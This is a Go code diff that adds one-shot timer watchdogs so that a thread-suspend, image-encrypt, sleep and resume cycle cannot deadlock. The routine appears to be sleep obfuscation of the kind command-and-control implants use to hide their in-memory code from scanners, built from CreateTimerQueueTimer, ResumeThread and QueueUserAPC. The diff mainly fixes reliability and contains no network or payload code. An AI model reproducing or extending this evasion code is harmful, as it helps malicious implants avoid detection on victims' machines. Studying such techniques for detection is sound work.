@@ -113,6 +113,13 @@ const (
 	watchdogMarginMinMs = 5000
 	watchdogMarginMaxMs = 15000
 
+	// Timeout for the resume-phase watchdogs. Fixed at 8 seconds — the
+	// resume loop should normally complete in milliseconds, so any real
+	// deadlock in the resume path is caught quickly. Not proportional
+	// to sleepMs because the resume phase's duration has nothing to do
+	// with the caller's sleep interval.
+	resumeWatchdogMs = 8000
+
 	// WT_EXECUTEONLYONCE: this timer fires exactly once and self-deletes.
 	// From Windows headers.
 	wtExecuteOnlyOnce = 0x00000008
@@ -611,12 +618,51 @@ func verifyAllPeersSuspended(peers []peerState) (bool, uint32) {
 	return true, 0
 }
 
-// resumeAndClose is the tail cleanup after cancelWatchdogs. Drain-resumes
-// each peer and closes its handle. Both the normal encryption path and
-// the safe-abort path call this at the end.
+// armResumeWatchdogs installs a per-peer one-shot Windows timer that
+// fires resumeWatchdogMs later, invoking ResumeThread on that peer's
+// handle. Symmetric with the arming that happens inline in
+// suspendAndArmPeers, but for the resume phase.
 //
-// This is what used to be `resumeAndCleanupPeers` minus the timer
-// cancellation, which is now a separate step.
+// Why the resume phase needs its own watchdogs: our resume loop makes
+// one LazyProc.Call per peer, and each Call's entersyscall/exitsyscall
+// participates in the same P-handoff race the suspend loop does. If a
+// just-resumed peer starts running and holds a P (particularly if
+// sysmon is still suspended and can't do handoff), a later resume in
+// the loop can deadlock in exitsyscall. The resume-phase watchdogs are
+// the safety net for that path — if any suspended peer's timer fires,
+// its ResumeThread wakes that peer, and whoever unblocks first
+// eventually releases a P for our stuck M.
+//
+// Timers are attached to peers[i].hTimer (which was zeroed by
+// cancelWatchdogs earlier). resumeAndClose will then cancel each
+// timer as part of its per-peer cleanup loop, so no separate cleanup
+// step is needed.
+func armResumeWatchdogs(peers []peerState) {
+	for i := range peers {
+		var hTimer uintptr
+		procCreateTimerQueueTimer.Call(
+			uintptr(unsafe.Pointer(&hTimer)),
+			0, // NULL queue = default process-wide queue
+			procResumeThread.Addr(),
+			uintptr(peers[i].hThread),
+			uintptr(resumeWatchdogMs),
+			0, // Period = 0
+			wtExecuteOnlyOnce,
+		)
+		peers[i].hTimer = hTimer
+	}
+}
+
+// resumeAndClose is the tail cleanup. Cancels each peer's watchdog
+// timer (if set), drain-resumes the peer, and closes the handle.
+// Both the normal encryption path and the safe-abort path call this.
+//
+// When called after armResumeWatchdogs, the timer cancellation blocks
+// (INVALID_HANDLE_VALUE) until any in-flight watchdog callback
+// completes — so if a timer fired mid-loop and its ResumeThread on
+// this peer is still running, we wait for it before proceeding to
+// CloseHandle. That closes the use-after-free window between callback
+// and close.
 func resumeAndClose(cycle uint64, peers []peerState) {
 	tids := make([]uint32, 0, len(peers))
 	for _, p := range peers {
@@ -851,6 +897,10 @@ func Sleep(sleepMs uint64) error {
 	if allSuspended, badTID := verifyAllPeersSuspended(peers); !allSuspended {
 		dbg("cycle=%d WATCHDOG rescued during suspend loop (tid=%d not suspended) — aborting encryption", cycle, badTID)
 		errorsTotal.Add(1)
+		// Abort path also gets resume-phase watchdogs — if the abort's
+		// own resume loop deadlocks (same P-handoff race), the timers
+		// will rescue it.
+		armResumeWatchdogs(peers)
 		resumeAndClose(cycle, peers)
 		return nil
 	}
@@ -876,6 +926,7 @@ func Sleep(sleepMs uint64) error {
 		// and bail. Failing to resume peers here would leave the process
 		// deadlocked with no way out.
 		dbg("cycle=%d QueueUserAPC returned 0", cycle)
+		armResumeWatchdogs(peers)
 		resumeAndClose(cycle, peers)
 		errorsTotal.Add(1)
 		return errors.New("apc: QueueUserAPC failed")
@@ -902,9 +953,19 @@ func Sleep(sleepMs uint64) error {
 
 	// -------- RESUME PEERS + CLOSE HANDLES --------
 	// Image is decrypted and executable again; peers are safe to run.
-	// Watchdogs were already cancelled before we entered encryption
-	// (see cancelWatchdogs above), so this only needs to drain-resume
-	// and close.
+	//
+	// Arm resume-phase watchdogs BEFORE calling resumeAndClose. Each
+	// timer will fire ResumeThread(peer) if the resume loop is still
+	// running resumeWatchdogMs later — safety net against the
+	// P-handoff race that we've now seen deadlock the resume path
+	// (resc_att3 hung between "resume begin" and "Sleep returning"
+	// with a just-resumed peer holding a P nobody else could reclaim).
+	//
+	// resumeAndClose cancels each timer as part of its per-peer
+	// cleanup, so a normal-path resume that completes fast will
+	// cancel timers before they fire; a deadlocked resume will get
+	// rescued when timers fire and start resuming peers externally.
+	armResumeWatchdogs(peers)
 	resumeAndClose(cycle, peers)
 
 	// If our actual sleep duration significantly exceeded the intended
